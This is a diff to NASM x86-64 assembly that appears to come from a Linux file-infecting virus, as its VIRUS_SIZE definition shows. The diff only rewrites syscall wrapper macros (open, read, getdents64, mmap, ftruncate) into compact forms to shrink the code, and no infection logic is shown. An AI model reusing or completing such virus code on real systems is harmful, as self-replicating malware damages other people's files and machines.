@@ -63,100 +63,134 @@
 
 %define VIRUS_SIZE          (VExitRoutine - _start)
 
+%macro _xor_reg 1
+    %ifidni %1, rdi
+        xor edi, edi
+    %elifidni %1, rsi
+        xor esi, esi
+    %elifidni %1, rdx
+        xor edx, edx
+    %elifidni %1, rax
+        xor eax, eax
+    %elifidni %1, r8
+        xor r8d, r8d
+    %elifidni %1, r9
+        xor r9d, r9d
+    %elifidni %1, r10
+        xor r10d, r10d
+    %else
+        xor %1, %1
+    %endif
+%endmacro
+
+; small/smart mov
+%macro _mov 2
+    %ifidni %1, %2
+        ; NOP
+    %elif %2 == 0
+        _xor_reg %1     ; 2 bytes
+    %elif %2 >= -128 && %2 <= 127
+        push %2         ; 2 bytes
+        pop %1          ; 1 byte (Total: 3 bytes)
+    %else
+        mov %1, %2      ; 5-7 bytes
+    %endif
+%endmacro
+
 %macro Write 3
-  mov   rdi,  %1          ; fd
-  mov   rsi,  %2          ; msg
-  mov   rdx,  %3          ; len
-  mov   rax,  SYS_WRITE
+  _mov   rdi,  %1          ; fd
+  _mov   rsi,  %2          ; msg
+  _mov   rdx,  %3          ; len
+  mov   eax,  SYS_WRITE
   syscall
 %endmacro
 
 %macro FSync 1
-  mov   rdi,  %1                  ; fd
-  mov   rax,  SYS_FSYNC
+  _mov   rdi,  %1                  ; fd
+  mov   eax,  SYS_FSYNC
   syscall
 %endmacro
 
 %macro MSync 3
-  mov   rdi,  %1                  ; addr
-  mov   rsi,  %2                  ; len
-  mov   rdx,  %3                  ; flag
-  mov   rax,  SYS_MSYNC
+  _mov   rdi,  %1                  ; addr
+  _mov   rsi,  %2                  ; len
+  _mov   rdx,  %3                  ; flag
+  mov   eax,  SYS_MSYNC
   syscall
 %endmacro
 
 %macro FStat 2 
-  mov   rdi,  %1                  ; 1st arg: fd
-  mov   rsi,  %2                  ; 2nd arg: Buffer
-  mov   rax,  SYS_FSTAT
+  _mov   rdi,  %1                  ; 1st arg: fd
+  _mov   rsi,  %2                  ; 2nd arg: Buffer
+  mov   eax,  SYS_FSTAT
   syscall
 %endmacro
 
 %macro FTruncate 2
-  mov   rdi,  %1                  ; fd
-  mov   rsi,  %2                  ; len
-  mov   rax,  SYS_FTRUNCATE
+  _mov   rdi,  %1                  ; fd
+  _mov   rsi,  %2                  ; len
+  mov   eax,  SYS_FTRUNCATE
   syscall
 %endmacro
 
 %macro Truncate 2
-  mov   rdi,  %1                  ; path
-  mov   rsi,  %2                  ; len
-  mov   rax,  SYS_TRUNCATE
+  _mov   rdi,  %1                  ; path
+  _mov   rsi,  %2                  ; len
+  mov   eax,  SYS_TRUNCATE
   syscall
 %endmacro
 
 %macro Open 3                     ; open(filename, flags)
-  mov   rdi,  %1                  ; 1st arg: filename pointer
-  mov   rsi,  %2                  ; 2nd arg: flags
-  mov   rdx,  %3                  ; 3rd arg: mode
-  mov   rax,  SYS_OPEN            ; syscall number
+  _mov   rdi,  %1                  ; 1st arg: filename pointer
+  _mov   rsi,  %2                  ; 2nd arg: flags
+  _mov   rdx,  %3                  ; 3rd arg: mode
+  mov   eax,  SYS_OPEN            ; syscall number
   syscall
 %endmacro
 
 %macro Read 3
-  mov   rdi,  %1                  ; fd
-  mov   rsi,  %2                  ; buf
-  mov   rdx,  %3                  ; count
-  mov   rax,  SYS_READ
+  _mov   rdi,  %1                  ; fd
+  _mov   rsi,  %2                  ; buf
+  _mov   rdx,  %3                  ; count
+  mov   eax,  SYS_READ
   syscall
 %endmacro
 
 %macro GetDents64 3
-  mov   rdi,  %1                  ; 1st arg: fd of directory
-  mov   rsi,  %2                  ; 2nd arg: out buffer
-  mov   rdx,  %3                  ; 3rd arg: sizeof buffer
-  mov   rax,  SYS_GETDENTS64
+  _mov   rdi,  %1                  ; 1st arg: fd of directory
+  _mov   rsi,  %2                  ; 2nd arg: out buffer
+  _mov   rdx,  %3                  ; 3rd arg: sizeof buffer
+  mov   eax,  SYS_GETDENTS64
   syscall
 %endmacro
 
 %macro Close 1
-  mov   rdi,  %1                  ; 1st arg: fd
-  mov   rax,  SYS_CLOSE           ; close(fd)
+  _mov   rdi,  %1                  ; 1st arg: fd
+  mov   eax,  SYS_CLOSE           ; close(fd)
   syscall
 %endmacro
 
 %macro Exit 1
-  mov   rdi,  %1                  ; Return value = 0
-  mov   rax,  SYS_EXIT            ; sys_exit
+  _mov   rdi,  %1                 ; Return value = 0
+  mov   eax,  SYS_EXIT            ; sys_exit
   syscall
 %endmacro
 
 %macro MMap 3
-  xor   rdi,  rdi                 ; NULL
-  mov   rsi,  %1                  ; size
-  mov   rdx,  %2                  ; protection
-  mov   r10,  MAP_SHARED          ; access 
-  mov   r8,   %3                  ; fd
-  xor   r9,   r9                  ; 0
-  mov   rax,  SYS_MMAP
+  _mov   rdi,  0                    ; NULL
+  _mov   rsi,  %1                   ; size
+  _mov   rdx,  %2                   ; protection
+  _mov   r10,  MAP_SHARED           ; access 
+  _mov   r8,   %3                   ; fd
+  _mov   r9,   0                    ; 0
+  mov   eax,  SYS_MMAP
   syscall
 %endmacro
 
 %macro MUnMap 2
-  mov   rdi,  %1                  ; region
-  mov   rsi,  %2                  ; size
-  mov   rax,  SYS_MUNMAP
+  _mov   rdi,  %1                  ; region
+  _mov   rsi,  %2                  ; size
+  mov   eax,  SYS_MUNMAP
   syscall
 %endmacro
 
